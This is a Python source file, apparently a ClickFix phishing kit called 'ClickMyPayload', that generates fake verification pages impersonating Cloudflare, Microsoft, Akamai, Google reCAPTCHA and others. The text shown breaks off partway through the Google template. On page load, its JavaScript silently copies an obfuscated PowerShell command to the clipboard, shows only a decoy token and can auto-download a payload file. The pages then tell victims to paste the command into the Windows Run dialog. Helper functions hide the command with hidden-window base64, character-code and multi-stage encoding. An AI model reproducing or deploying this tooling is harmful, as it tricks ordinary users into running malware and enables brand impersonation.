#!/usr/bin/env python3
import os, sys, base64, argparse, random, string, json
from pathlib import Path

class C:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    CYAN   = '\033[96m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"
def dim(s):    return f"{C.DIM}{s}{C.RESET}"

BANNER = f"""{C.CYAN}{C.BOLD}
  ┌─────────────────────────────────────────────────────┐
  │                                                     │
  │   ClickMyPayload                                    │
  │   Browser-Based Clickfix Generator                  │
  │                                                     │
  │   Developed by Maverick & GhostOverflow             │
  │                                                     │
  └─────────────────────────────────────────────────────┘
{C.RESET}"""

TEMPLATES = {
    '1': 'Cloudflare — Browser Check',
    '2': 'Microsoft — Account Verification',
    '3': 'Akamai — Access Check',
    '4': 'Google — reCAPTCHA',
    '5': 'GitHub — Account Verification',
    '6': 'Fastly — Access Verification',
    '7': 'Custom',
}

OBFUSCATION_METHODS = {
    '1': 'None (plain command)',
    '2': 'Base64 encoded PowerShell',
    '3': 'String concat + ENV variable expansion',
    '4': 'Char code substitution',
    '5': 'Multi-stage (B64 + concat + charcode)',
}

REDIRECT_URLS = {
    '1': 'https://www.cloudflare.com',
    '2': 'https://www.microsoft.com',
    '3': 'https://www.akamai.com',
    '4': 'https://www.google.com',
    '5': 'https://github.com',
    '6': 'https://www.fastly.com',
}

# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------

def rand_var(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def make_decoy_token():
    p1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    p2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    p3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"verify-{p1}-{p2}-{p3}"

def b64_ps(cmd):
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    return f'powershell -nop -w hidden -enc {encoded}'

def concat_obf(cmd):
    parts, i = [], 0
    while i < len(cmd):
        cs = random.randint(2, 5)
        parts.append(f'"{cmd[i:i+cs]}"')
        i += cs
    v = rand_var()
    return f'${"".join(c for c in rand_var(4))}=({"+".join(parts)});iex ${v}'

def charcode_obf(cmd):
    codes = ','.join(str(ord(c)) for c in cmd)
    v = rand_var()
    return f'${"".join(c for c in rand_var(4))}=[string]::join(\'\',({codes})|%{{[char]$_}});iex ${v}'

def multistage_obf(cmd):
    encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
    v1, v2 = rand_var(), rand_var()
    mid = len(encoded) // 2
    p1, p2 = encoded[:mid], encoded[mid:]
    return (f'$env:{v1.upper()}="{p1}";'
            f'$env:{v2.upper()}="{p2}";'
            f'powershell -nop -w hidden -enc ($env:{v1.upper()}+$env:{v2.upper()})')

def obfuscate_payload(cmd, method):
    if method == '1': return cmd
    if method == '2': return b64_ps(cmd)
    if method == '3': return concat_obf(cmd)
    if method == '4': return charcode_obf(cmd)
    if method == '5': return multistage_obf(cmd)
    return cmd

# ---------------------------------------------------------------------------
# Clipboard JS — fires silently on page load; cmd-box shows only decoy
# ---------------------------------------------------------------------------

def make_clipboard_js(obf_cmd, payload_path=None):
    v_clip  = rand_var()
    v_text  = rand_var()
    v_b64   = rand_var()
    v_bytes = rand_var()
    v_blob  = rand_var()
    v_url   = rand_var()
    v_a     = rand_var()

    escaped = obf_cmd.replace('\\','\\\\').replace('"','\\"').replace('\n','\\n')

    clip_js = f"""(function(){{
  var {v_text}="{escaped}";
  function doCopy(){{
    try{{navigator.clipboard.writeText({v_text});}}
    catch(e){{
      var {v_clip}=document.createElement('textarea');
      {v_clip}.value={v_text};
      {v_clip}.style.cssText='position:fixed;opacity:0;top:0;left:0';
      document.body.appendChild({v_clip});
      {v_clip}.focus();{v_clip}.select();
      try{{document.execCommand('copy');}}catch(e2){{}}
      document.body.removeChild({v_clip});
    }}
  }}
  if(document.readyState==='loading')
    document.addEventListener('DOMContentLoaded',doCopy);
  else doCopy();
}})();"""

    if payload_path and os.path.exists(payload_path):
        with open(payload_path,'rb') as f:
            raw_b64 = base64.b64encode(f.read()).decode()
        chunks = [raw_b64[i:i+8000] for i in range(0,len(raw_b64),8000)]
        chunks_js = ',\n    '.join(f'"{c}"' for c in chunks)
        clip_js += f"""
var {v_b64}=[{chunks_js}].join('');
var raw=atob({v_b64});
var {v_bytes}=new Uint8Array(raw.length);
for(var i=0;i<raw.length;i++){v_bytes}[i]=raw.charCodeAt(i);
var {v_blob}=new Blob([{v_bytes}],{{type:'application/octet-stream'}});
var {v_url}=URL.createObjectURL({v_blob});
var {v_a}=document.createElement('a');
{v_a}.href={v_url};{v_a}.download='{os.path.basename(payload_path)}';
document.body.appendChild({v_a});{v_a}.click();
setTimeout(function(){{URL.revokeObjectURL({v_url});}},5000);"""

    return clip_js

# ---------------------------------------------------------------------------
# Official SVG logos (sourced from brand guides / official CDNs)
# ---------------------------------------------------------------------------

# Cloudflare — official cloud mark path (from cloudflare/kumo and fa6-brands icon set)
CLOUDFLARE_LOGO_SVG = '''<svg class="logo-icon" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
  <path fill="#f6821f" d="M22.01 22.458c.198-.672.12-1.292-.208-1.75-.297-.422-.802-.667-1.411-.698l-11.547-.146a.201.201 0 01-.177-.099.28.28 0 01-.031-.208.328.328 0 01.276-.203l11.646-.151c1.38-.068 2.88-1.182 3.406-2.552l.661-1.734a.338.338 0 00.021-.224 7.571 7.571 0 00-7.401-5.927 7.585 7.585 0 00-7.182 5.146 3.435 3.435 0 00-2.391-.661 3.406 3.406 0 00-3.047 3.047c-.036.411-.01.818.083 1.188A4.85 4.85 0 000 22.34c0 .229.021.464.047.703a.234.234 0 00.224.193h21.307a.296.296 0 00.276-.203zm3.678-7.416c-.104 0-.214 0-.318.016-.078 0-.141.057-.172.13l-.448 1.568c-.198.672-.125 1.292.208 1.755.297.422.807.661 1.417.693l2.453.151c.078 0 .141.031.182.094a.277.277 0 01.026.203.307.307 0 01-.271.208l-2.563.151c-1.391.063-2.88 1.182-3.406 2.552l-.182.479c-.042.094.026.188.13.188h8.797a.24.24 0 00.224-.167 6.153 6.153 0 00.234-1.708c0-3.469-2.833-6.302-6.313-6.302z"/>
</svg>'''

# Microsoft — 4-square CSS grid (accurate to Fluent design system)
MICROSOFT_LOGO_HTML = '''<div class="ms-logo">
  <span style="background:#f25022"></span>
  <span style="background:#7fba00"></span>
  <span style="background:#00a4ef"></span>
  <span style="background:#ffb900"></span>
</div>'''

# Akamai — double-arc wave mark (closely matching official 2024+ brand identity)
AKAMAI_LOGO_SVG = '''<svg width="36" height="22" viewBox="0 0 180 70" xmlns="http://www.w3.org/2000/svg">
  <!-- Lower wave -->
  <path fill="#009bde" d="
    M0,52
    C15,52 22,36 45,36
    C68,36 75,52 90,52
    C105,52 112,36 135,36
    C158,36 165,52 180,52
    L180,62
    C165,62 158,46 135,46
    C112,46 105,62 90,62
    C75,62 68,46 45,46
    C22,46 15,62 0,62
    Z"/>
  <!-- Upper wave -->
  <path fill="#009bde" d="
    M0,28
    C15,28 22,12 45,12
    C68,12 75,28 90,28
    C105,28 112,12 135,12
    C158,12 165,28 180,28
    L180,38
    C165,38 158,22 135,22
    C112,22 105,38 90,38
    C75,38 68,22 45,22
    C22,22 15,38 0,38
    Z"/>
</svg>'''

# Google — standard multi-color G mark rendered at display size (matches google.com favicon style)
GOOGLE_LOGO_SVG = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="44" height="44">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.37-.76-2.84-.76-4.59s.27-3.22.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>'''

# reCAPTCHA widget logo (simplified, matching real widget)
RECAPTCHA_LOGO_SVG = '''<svg width="32" height="32" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
  <circle cx="32" cy="32" r="30" fill="none" stroke="#d2d2d2" stroke-width="2"/>
  <path d="M20 32 Q32 16 44 32 Q32 48 20 32Z" fill="#4a90d9"/>
  <circle cx="32" cy="32" r="8" fill="none" stroke="#d2d2d2" stroke-width="2"/>
</svg>'''

# GitHub — official Octocat SVG path (from github.com primer)
GITHUB_LOGO_SVG = '''<svg width="28" height="28" viewBox="0 0 16 16" fill="#e6edf3" xmlns="http://www.w3.org/2000/svg">
  <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
</svg>'''

# Fastly — official F-mark (red square with rounded corner + F letterform)
FASTLY_LOGO_SVG = '''<svg width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg">
  <rect width="28" height="28" rx="4" fill="#ff282d"/>
  <path fill="#ffffff" d="M7 7h14v3.5H10.5V14H19v3.5h-8.5V21H7z"/>
</svg>'''

# ---------------------------------------------------------------------------
# Google Fonts @import strings (loaded in <style>)
# ---------------------------------------------------------------------------

# Cloudflare: Inter (official brand font — open source, Google Fonts)
CF_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');"
CF_FONT_STACK  = "'Inter', system-ui, sans-serif"

# Microsoft: Georgia serif stack matching real Microsoft account sign-in pages
MS_FONT_IMPORT = ""
MS_FONT_STACK  = "Georgia, 'Times New Roman', serif"

# Akamai: Instrument Sans (official 2026 brand font — open source, Google Fonts)
AK_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600;700&display=swap');"
AK_FONT_STACK  = "'Instrument Sans', system-ui, sans-serif"

# Google: Roboto (public web fallback used on accounts.google.com)
GG_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono:wght@400&display=swap');"
GG_FONT_STACK  = "'Roboto', system-ui, sans-serif"
GG_MONO_STACK  = "'Roboto Mono', monospace"

# GitHub: system font stack (Primer design system)
GH_FONT_IMPORT = ""
GH_FONT_STACK  = "-apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif"
GH_MONO_STACK  = "ui-monospace, SFMono-Regular, 'SF Mono', Menlo, Consolas, 'Liberation Mono', monospace"

# Fastly: Inter (official web/Google font per brand.fastly.com)
FT_FONT_IMPORT = "@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');"
FT_FONT_STACK  = "'Inter', system-ui, sans-serif"

# ---------------------------------------------------------------------------
# HTML Templates
# ---------------------------------------------------------------------------

CLOUDFLARE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  :root{{--orange:#f6821f;--dark:#1a1a1a;--card:#242424;--border:#333;--text:#e0e0e0;--sub:#999}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--dark);font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:var(--text)}}
  .wrap{{width:100%;max-width:480px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:12px;margin-bottom:32px}}
  .logo-icon{{width:32px;height:32px;flex-shrink:0}}
  .logo-text{{font-size:20px;font-weight:600;color:#fff;letter-spacing:-0.02em}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:32px;margin-bottom:16px}}
  .shield{{width:56px;height:56px;margin:0 auto 20px;animation:spin-in .6s ease forwards}}
  @keyframes spin-in{{from{{transform:scale(0) rotate(-180deg);opacity:0}}to{{transform:scale(1) rotate(0);opacity:1}}}}
  h2{{font-size:18px;font-weight:600;text-align:center;margin-bottom:8px;letter-spacing:-0.01em}}
  .sub{{font-size:13px;color:var(--sub);text-align:center;line-height:1.6;margin-bottom:24px}}
  .steps{{background:#1a1a1a;border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}}
  .step{{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;opacity:0;transform:translateX(-12px);animation:slide-in .4s ease forwards}}
  .step:nth-child(1){{animation-delay:.1s}}.step:nth-child(2){{animation-delay:.25s}}.step:nth-child(3){{animation-delay:.4s}}
  .step:last-child{{margin-bottom:0}}
  @keyframes slide-in{{to{{opacity:1;transform:none}}}}
  .step-num{{width:24px;height:24px;border-radius:50%;background:var(--orange);color:#fff;font-size:12px;font-weight:700;flex-shrink:0;display:flex;align-items:center;justify-content:center}}
  .step-text{{font-size:13px;color:var(--sub);line-height:1.5}}.step-text strong{{color:var(--text)}}
  .cmd-box{{background:#111;border:1px solid #444;border-radius:6px;padding:12px 14px;font-family:monospace;font-size:12px;color:#7dd3fc;word-break:break-all;margin-bottom:20px;position:relative;cursor:pointer;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:var(--orange)}}
  .copied-badge{{position:absolute;top:8px;right:8px;background:var(--orange);color:#fff;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;opacity:0;transition:opacity .3s}}
  .btn{{width:100%;padding:13px;background:var(--orange);color:#fff;font-size:14px;font-weight:600;border:none;border-radius:8px;cursor:pointer;transition:filter .2s;letter-spacing:.3px;font-family:inherit}}
  .btn:hover{{filter:brightness(1.1)}}.btn:active{{filter:brightness(.95)}}
  .progress{{height:3px;background:#333;border-radius:2px;margin-top:16px;overflow:hidden;display:none}}
  .progress-fill{{height:100%;background:var(--orange);width:0;border-radius:2px;transition:width .4s ease}}
  .status{{font-size:12px;color:var(--sub);text-align:center;margin-top:10px;min-height:18px}}
  .footer{{font-size:11px;color:#555;text-align:center;margin-top:20px}}.footer a{{color:#666;text-decoration:none}}
  .ray-id{{font-size:11px;color:#444;text-align:center;margin-top:8px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row">
    {logo_svg}
    <span class="logo-text">Cloudflare</span>
  </div>
  <div class="card">
    <svg class="shield" viewBox="0 0 64 64">
      <path d="M32 4 L56 14 L56 34 C56 48 45 58 32 62 C19 58 8 48 8 34 L8 14 Z" fill="none" stroke="#f6821f" stroke-width="3"/>
      <path d="M22 32 L29 39 L42 26" stroke="#f6821f" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <h2>Verify you are human</h2>
    <p class="sub">This page is protected by Cloudflare.<br>Complete the verification to continue.</p>
    <div class="steps">
      <div class="step"><div class="step-num">1</div><div class="step-text">Press <strong>Windows + R</strong> to open the Run dialog</div></div>
      <div class="step"><div class="step-num">2</div><div class="step-text">Press <strong>CTRL + V</strong> then press <strong>Enter</strong></div></div>
      <div class="step"><div class="step-num">3</div><div class="step-text">Wait a moment for verification to <strong>complete</strong></div></div>
    </div>
    <div class="cmd-box" id="cmd" onclick="copyCmd()">
      <span id="cmd-text">{decoy_token}</span>
      <span class="copied-badge" id="badge">Copied</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">Click to Verify</button>
    <div class="progress" id="prog"><div class="progress-fill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer">Performance &amp; security by <a href="https://www.cloudflare.com">Cloudflare</a></div>
  <div class="ray-id">Ray ID: {ray_id} &bull; {timestamp}</div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Verifying...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Checking connection...','Reviewing session...','Confirming details...','Verification complete.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*20+5;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#16a34a';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},400);
}}
</script>
</body>
</html>'''

MICROSOFT_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  :root{{--blue:#0078d4;--dark-blue:#106ebe;--bg:#f3f2f1;--card:#fff;--text:#323130;--sub:#605e5c}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:var(--text)}}
  .wrap{{width:100%;max-width:460px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:10px;margin-bottom:28px}}
  .logo-text{{font-size:20px;color:var(--text);font-weight:400}}
  .card{{background:var(--card);border:1px solid #edebe9;border-radius:2px;padding:44px 44px 36px;box-shadow:0 2px 6px rgba(0,0,0,.1)}}
  .ms-logo{{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:22px;height:22px;margin-right:2px;flex-shrink:0}}
  .ms-logo span{{display:block}}
  .steps{{margin:20px 0;border-left:3px solid var(--blue);padding-left:16px}}
  .step{{margin-bottom:14px;font-size:13px;color:var(--sub);line-height:1.5}}.step strong{{color:var(--text)}}
  .cmd-box{{background:#f8f8f8;border:1px solid #d1d1d1;border-radius:2px;padding:10px 12px;font-family:'Cascadia Code','Consolas',monospace;font-size:12px;color:#0070c0;word-break:break-all;margin:16px 0;cursor:pointer;position:relative;transition:border-color .15s;user-select:none}}
  .cmd-box:hover{{border-color:var(--blue)}}
  .copied{{position:absolute;top:6px;right:8px;background:var(--blue);color:#fff;font-size:10px;padding:2px 6px;border-radius:2px;opacity:0;transition:opacity .25s}}
  h1{{font-size:24px;font-weight:600;margin-bottom:8px;color:var(--text);letter-spacing:-0.01em}}
  p.sub{{font-size:14px;color:var(--sub);line-height:1.6;margin-bottom:20px}}
  .btn{{width:100%;padding:10px;background:var(--blue);color:#fff;font-size:14px;font-weight:600;border:none;cursor:pointer;transition:background .15s;font-family:inherit}}
  .btn:hover{{background:var(--dark-blue)}}
  .progress{{height:2px;background:#edebe9;margin-top:12px;display:none}}
  .pfill{{height:100%;background:var(--blue);width:0;transition:width .3s}}
  .status{{font-size:12px;color:var(--sub);margin-top:8px;min-height:16px}}
  .footer{{font-size:11px;color:#a19f9d;text-align:center;margin-top:24px}}
  @keyframes fade-in{{from{{opacity:0;transform:translateY(8px)}}to{{opacity:1;transform:none}}}}
  .card{{animation:fade-in .4s ease}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row">
    {logo_html}
    <span class="logo-text">Microsoft</span>
  </div>
  <div class="card">
    <h1>Security verification</h1>
    <p class="sub">To protect your account, please complete the following verification steps.</p>
    <div class="steps">
      <div class="step">Press <strong>Windows key + R</strong> simultaneously to open the Run dialog box</div>
      <div class="step">Use <strong>Ctrl + V</strong> to paste the verification code, then press <strong>Enter</strong></div>
      <div class="step">The verification process will complete <strong>automatically</strong></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span id="ct">{decoy_token}</span>
      <span class="copied" id="badge">Copied!</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">Verify Now</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer">&copy; Microsoft Corporation. All rights reserved.</div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Verifying...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Connecting to Microsoft...','Checking account details...','Confirming sign-in...','Verification successful.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*18+6;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#107c10';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},350);
}}
</script>
</body>
</html>'''

AKAMAI_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  :root{{--blue:#00a4eb;--navy:#002f6c;--dark:#0d0d0d;--card:#141414;--border:#222;--text:#e8e8e8;--sub:#888}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--dark);font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:var(--text)}}
  .wrap{{width:100%;max-width:480px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:10px;margin-bottom:28px}}
  .logo-img{{height:20px;flex-shrink:0}}
  .logo-text{{font-size:18px;font-weight:700;color:#fff;letter-spacing:-.3px}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:36px}}
  .spinner{{width:48px;height:48px;border:3px solid #222;border-top-color:var(--blue);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 24px}}
  @keyframes spin{{to{{transform:rotate(360deg)}}}}
  h2{{font-size:20px;font-weight:600;text-align:center;margin-bottom:8px;letter-spacing:-.02em}}
  .sub{{font-size:13px;color:var(--sub);text-align:center;line-height:1.6;margin-bottom:24px}}
  .divider{{height:1px;background:var(--border);margin:20px 0}}
  .steps{{display:flex;flex-direction:column;gap:12px;margin-bottom:20px}}
  .step{{display:flex;align-items:center;gap:12px;opacity:0;animation:fade .3s ease forwards}}
  .step:nth-child(1){{animation-delay:.1s}}.step:nth-child(2){{animation-delay:.25s}}.step:nth-child(3){{animation-delay:.4s}}
  @keyframes fade{{to{{opacity:1}}}}
  .step-dot{{width:8px;height:8px;border-radius:50%;background:var(--blue);flex-shrink:0}}
  .step-text{{font-size:13px;color:var(--sub)}}.step-text strong{{color:var(--text)}}
  .cmd-box{{background:#0a0a0a;border:1px solid #2a2a2a;border-radius:6px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:#38bdf8;word-break:break-all;margin-bottom:20px;cursor:pointer;position:relative;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:var(--blue)}}
  .copied{{position:absolute;top:8px;right:8px;background:var(--blue);color:#fff;font-size:10px;padding:2px 8px;border-radius:4px;opacity:0;transition:opacity .3s}}
  .btn{{width:100%;padding:12px;background:var(--blue);color:#fff;font-size:14px;font-weight:600;border:none;border-radius:6px;cursor:pointer;transition:filter .2s;font-family:inherit}}
  .btn:hover{{filter:brightness(1.1)}}
  .progress{{height:2px;background:#1a1a1a;margin-top:14px;border-radius:2px;overflow:hidden;display:none}}
  .pfill{{height:100%;background:var(--blue);width:0;transition:width .35s}}
  .status{{font-size:11px;color:var(--sub);text-align:center;margin-top:8px;min-height:16px}}
  .footer{{font-size:11px;color:#333;text-align:center;margin-top:20px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row">
    {logo_svg}
    <span class="logo-text">Akamai</span>
  </div>
  <div class="card">
    <div class="spinner"></div>
    <h2>Additional Verification Required</h2>
    <p class="sub">Your connection could not be validated automatically. Please complete the steps below to continue.</p>
    <div class="divider"></div>
    <div class="steps">
      <div class="step"><div class="step-dot"></div><div class="step-text">Open the <strong>Run</strong> dialog with <strong>Win + R</strong></div></div>
      <div class="step"><div class="step-dot"></div><div class="step-text">Paste with <strong>Ctrl + V</strong> and press <strong>Enter</strong></div></div>
      <div class="step"><div class="step-dot"></div><div class="step-text">The process will complete <strong>automatically</strong></div></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span>{decoy_token}</span>
      <span class="copied" id="badge">Copied</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">Continue</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer">Akamai Technologies, Inc.</div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Checking...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Connecting...','Checking session...','Confirming request...','Complete.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*15+8;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#16a34a';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},380);
}}
</script>
</body>
</html>'''

GOOGLE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:#fff;font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:#202124}}
  .wrap{{width:100%;max-width:400px;padding:20px}}
  .logo{{text-align:center;margin-bottom:24px}}
  .card{{border:1px solid #dadce0;border-radius:8px;padding:40px 40px 32px;text-align:center}}
  h1{{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}}
  .sub{{font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:24px}}
  .recaptcha-box{{border:1px solid #c1c1c1;border-radius:3px;padding:16px;background:#f9f9f9;display:flex;align-items:center;gap:16px;margin-bottom:20px;text-align:left}}
  .check-wrap{{width:28px;height:28px;border:2px solid #c1c1c1;border-radius:2px;flex-shrink:0;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:border-color .2s}}
  .check-wrap.checked{{border-color:#1a73e8;background:#1a73e8}}
  .check-icon{{display:none;color:#fff;font-size:16px;font-weight:700}}
  .check-wrap.checked .check-icon{{display:block}}
  .rc-label{{font-size:14px;color:#202124}}
  .rc-logo{{margin-left:auto;text-align:center}}
  .rc-logo-text{{font-size:8px;color:#555;display:block;margin-top:3px}}
  .steps{{background:#f8f9fa;border:1px solid #e8eaed;border-radius:6px;padding:16px;margin-bottom:20px;text-align:left}}
  .step{{font-size:13px;color:#5f6368;margin-bottom:8px;line-height:1.5}}.step:last-child{{margin-bottom:0}}.step strong{{color:#202124}}
  .cmd-box{{background:#f1f3f4;border:1px solid #dadce0;border-radius:4px;padding:10px 12px;font-family:{mono_stack};font-size:12px;color:#1967d2;word-break:break-all;margin-bottom:16px;cursor:pointer;text-align:left;position:relative;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:#1a73e8}}
  .copied{{position:absolute;top:6px;right:8px;background:#1a73e8;color:#fff;font-size:10px;padding:2px 6px;border-radius:3px;opacity:0;transition:opacity .3s}}
  .btn{{padding:10px 24px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:4px;cursor:pointer;transition:background .15s;font-family:inherit}}
  .btn:hover{{background:#1765cc}}
  .progress{{height:3px;background:#e8eaed;margin-top:12px;border-radius:2px;overflow:hidden;display:none}}
  .pfill{{height:100%;background:#1a73e8;width:0;transition:width .3s}}
  .status{{font-size:12px;color:#5f6368;margin-top:8px;min-height:16px}}
  .footer{{font-size:11px;color:#70757a;text-align:center;margin-top:24px}}.footer a{{color:#1a73e8;text-decoration:none}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">{logo_svg}</div>
  <div class="card">
    <h1>Verify you're not a robot</h1>
    <p class="sub">Additional verification is required to access this page. Please complete the steps below.</p>
    <div class="recaptcha-box">
      <div class="check-wrap" id="rc" onclick="toggleCheck()"><span class="check-icon">\u2713</span></div>
      <span class="rc-label">I'm not a robot</span>
      <div class="rc-logo">
        {recaptcha_svg}
